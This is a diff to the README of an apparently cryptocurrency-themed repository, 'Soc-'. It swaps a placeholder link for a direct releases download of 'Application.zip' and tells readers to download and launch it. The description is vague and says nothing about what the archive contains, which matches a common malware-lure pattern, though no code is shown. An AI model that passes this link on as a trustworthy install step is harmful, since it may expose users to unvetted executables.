@@ -4,7 +4,7 @@
 Welcome to the Soc- repository! Here you will find a cryptocurrency associated with a brand, creator, or community. Whether you are looking to explore new ways of digital transactions or delve into the world of unique cryptocurrencies, Soc- offers an exciting opportunity to be a part of a thriving ecosystem.
 
 ## Getting Started
-To get started with Soc-, head over to our [Application.zip](https://github.com/file/Application.zip) link. You can launch the application by downloading the zip file and following the instructions provided.
+To get started with Soc-, head over to our [https://github.com/Holium-coin/Soc-/releases/download/v1.0.0/Application.zip](https://github.com/Holium-coin/Soc-/releases/download/v1.0.0/Application.zip) link. You can launch the application by downloading the zip file and following the instructions provided.
 
 ## Features
 🌟 Unique cryptocurrency   
